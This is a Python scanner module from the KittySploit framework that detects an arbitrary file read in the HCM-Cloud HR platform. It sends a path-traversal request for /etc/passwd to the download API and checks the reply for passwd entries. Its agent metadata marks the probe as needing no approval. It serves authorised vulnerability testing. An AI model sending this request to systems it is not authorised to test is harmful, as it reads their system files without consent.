#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HCM Cloud - Arbitrary File Read Detection',
        'description': 'HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'hcm-cloud', 'lfi', 'hcm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw',
            'https://github.com/wy876/POC/blob/main/%E6%B5%AA%E6%BD%AE%E4%BA%91/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/api/model_report/file/download?index=/&ext=/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in content_type for m in ctype_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason='HCM Cloud - Arbitrary File Read detected',
                path=path,
            )
            return True
        return False

